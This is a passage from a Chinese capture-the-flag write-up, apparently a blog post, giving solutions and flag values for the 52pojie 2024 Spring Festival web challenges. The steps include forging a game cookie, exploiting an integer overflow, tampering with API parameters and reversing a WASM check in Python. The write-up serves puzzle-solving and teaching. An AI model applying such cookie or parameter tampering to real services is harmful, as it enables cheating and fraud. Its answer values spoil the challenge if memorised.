class="name">pre</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; z-index: -1; left: 0; top: 0; right: 0; margin: 0; color: white; user-select: none; pointer-events: none; white-space: pre-wrap; word-break: break-all; line-height: 1;&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><p>字符串为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag5&#123;P3prqF&#125;</span><br></pre></td></tr></table></figure><h5 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h5><p>二维码扫码：<a href="https://2024challenge.52pojie.cn/">https://2024challenge.52pojie.cn/</a></p><p>计算md5即可1c450bbafad15ad87c32831fa1a616fc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag6&#123;20240217&#125;</span><br></pre></td></tr></table></figure><h5 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h5><p>github：<a href="https://github.com/ganlvtech/52pojie-2024-challenge/commit/6bbac038c4813fbc5d129a8d605471ea2e374786">https://github.com/ganlvtech/52pojie-2024-challenge/commit/6bbac038c4813fbc5d129a8d605471ea2e374786</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag7&#123;Djl9NQ&#125;</span><br></pre></td></tr></table></figure><h5 id="flag8"><a href="#flag8" class="headerlink" title="flag8"></a>flag8</h5><p>观察cookie值</p><p>通过Cookie-Editor修改game2048_user_data的Value即可实现（以下立刻达到22916分）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dPEEH/JpzQhCzBwTURxsHWy5lkrXvbkTYZUDbaJWa7LsE81KzmCB6blr3FkOA/c0rSvyuVPMEIHrPFMuk7OtJIzw5NTuiFBVBpNMUBzprkLAx2tcW8+uWgAxgqMfqmaIYUq/8JG0IGuw</span><br><span class="line">flag8&#123;OaOjIK&#125;</span><br></pre></td></tr></table></figure><h5 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h5><p>记事本自动换行调整高度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag9&#123;KHTALK&#125;</span><br></pre></td></tr></table></figure><h5 id="flag10"><a href="#flag10" class="headerlink" title="flag10"></a>flag10</h5><p>F12 <a href="https://2024challenge.52pojie.cn/flag4_flag10.png">https://2024challenge.52pojie.cn/flag4_flag10.png</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag10&#123;6BxMkW&#125;</span><br></pre></td></tr></table></figure><h5 id="flag11"><a href="#flag11" class="headerlink" title="flag11"></a>flag11</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/kali/.local/bin/gaps run --generations=10 --population=200 --size=30 flag11.png solution.png</span><br><span class="line">flag11&#123;HPQfVF&#125;</span><br></pre></td></tr></table></figure><h5 id="flag12"><a href="#flag12" class="headerlink" title="flag12"></a>flag12</h5><p>Wasm文件: <a href="https://2024challenge.52pojie.cn/flag12/flag12.wasm">https://2024challenge.52pojie.cn/flag12/flag12.wasm</a></p><p>WebAssembly代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">(type $t0 (func (param i32) (result i32)))</span><br><span class="line">(func $get_flag12 (export &quot;get_flag12&quot;) (type $t0) (param $p0 i32) (result i32)</span><br><span class="line">(select</span><br><span class="line">(i32.const 1213159497)</span><br><span class="line">(i32.const 0)</span><br><span class="line">(i32.eq</span><br><span class="line">(i32.mul</span><br><span class="line">(local.get $p0)</span><br><span class="line">(i32.const 1103515245))</span><br><span class="line">(i32.const 1))))</span><br><span class="line">(memory $memory (export &quot;memory&quot;) 16)</span><br><span class="line">(global $__stack_pointer (mut i32) (i32.const 1048576))</span><br><span class="line">(global $__data_end (export &quot;__data_end&quot;) i32 (i32.const 1048576))</span><br><span class="line">(global $__heap_base (export &quot;__heap_base&quot;) i32 (i32.const 1048576)))</span><br></pre></td></tr></table></figure><p><code>get_flag12</code>函数将输入的数值乘以1103515245，如果然后除以4294967296的余数等于1，则返回1213159497，否则返回0。这个数值就是1103515245的乘法逆元。</p><p>python解题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 求乘法逆元</span></span><br><span class="line">secret = <span class="built_in">pow</span>(<span class="number">1103515245</span>, -<span class="number">1</span>, <span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;输入数字为：<span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检验结果</span></span><br><span class="line"><span class="keyword">assert</span> (secret * <span class="number">1103515245</span>) % (<span class="number">2</span>**<span class="number">32</span>) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换结果为字符串</span></span><br><span class="line">flag12 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">1213159497</span></span><br><span class="line"><span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">    flag12 = <span class="built_in">chr</span>(num &amp; <span class="number">0xff</span>) + flag12</span><br><span class="line">    num &gt;&gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;flag12为：flag12&#123;&#123;<span class="subst">&#123;flag12&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line">flag12&#123;HOXI&#125;</span><br></pre></td></tr></table></figure><h5 id="flagA"><a href="#flagA" class="headerlink" title="flagA"></a>flagA</h5><p>将cookie中flagA的值输入到uid可以实现解码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagA&#123;xxxxxxxx&#125;</span><br></pre></td></tr></table></figure><h5 id="flagB"><a href="#flagB" class="headerlink" title="flagB"></a>flagB</h5><p>使用商品后获得：关键词是“溢出”</p><p>整数溢出：424672867399</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagB&#123;xxxxxxxx&#125;</span><br></pre></td></tr></table></figure><h5 id="flagC"><a href="#flagC" class="headerlink" title="flagC"></a>flagC</h5><p>coco的数据集</p><p>抓api改参数可以看到隐藏物体的分类名</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
